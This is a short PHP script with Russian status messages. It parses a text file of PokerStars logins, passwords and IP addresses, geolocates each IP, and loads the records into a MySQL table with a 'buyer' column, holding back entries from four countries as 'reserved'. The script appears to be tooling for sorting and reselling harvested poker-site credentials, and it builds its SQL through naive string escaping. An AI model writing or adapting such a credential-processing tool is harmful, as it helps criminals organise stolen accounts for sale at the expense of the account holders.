<?
 include ("bdconfig.php");
 $Link=mysql_connect($Host,$User,$Password);
 mysql_query("SET NAMES cp1251");
 $Date_Time=date("Y");
 
 include("geoipcity.inc");
 include("geoipregionvars.php");
 $gi = geoip_open("GeoIP.dat",GEOIP_STANDARD);
 $f=file('stars.txt');
 
 for($i=0;$i<count($f);$i++)
 {
      $s=$f[$i];

      if (strpos($s, 'PokerStarspoker') !== false) 
      { 
		echo "found it!!!!!!!!!!!!"; 
		echo $s . "<br>";
		$ii=strpos($s, 'PokerStarspoker');
		echo "ii=$ii";
		$s=substr($s,$ii+10);
		echo $s . "<br>";
      }

      $s=substr($s, 8);

      $pieces = explode("@P", $s);
      $s1=$pieces[0];
      $s2=$pieces[1];

      $pieces1 = explode(":", $s1);
      $pieces2 = explode(":", $s2);

      $login=$pieces1[0];
      $pass=$pieces1[1];
      $ip=$pieces2[1];
      $ip=substr($ip,0,strlen($ip)-2);
      $record = geoip_record_by_addr($gi,$ip);
      $country=$record->country_name; 
      $buyer="";
   
      $login=str_replace("'","\'",$login);
      $pass=str_replace("'","\'",$pass);

	  if($country!="United States" && $country!="Italy" && $country!="Belgium" && $country!="Spain")
	  {
		$Query = "INSERT into $Table_Poker values('0', NULL, '$login', '$pass','$ip', '$country','$buyer' ,'','','','','','','','','','','','');";
		print $i . ":" . $Query;
	
		if(mysql_db_query ($DBName, $Query, $Link))
			print "Запись в БД успешно добавлена !\r\n<br>\r\n<br>" ;
		else
			print("Неверно заполнены поля");   
	  }
	  else
	  {
		print("Резервация: " . $country);   
	  }
		
      $country="";
 }

 mysql_close($Link); 


?>

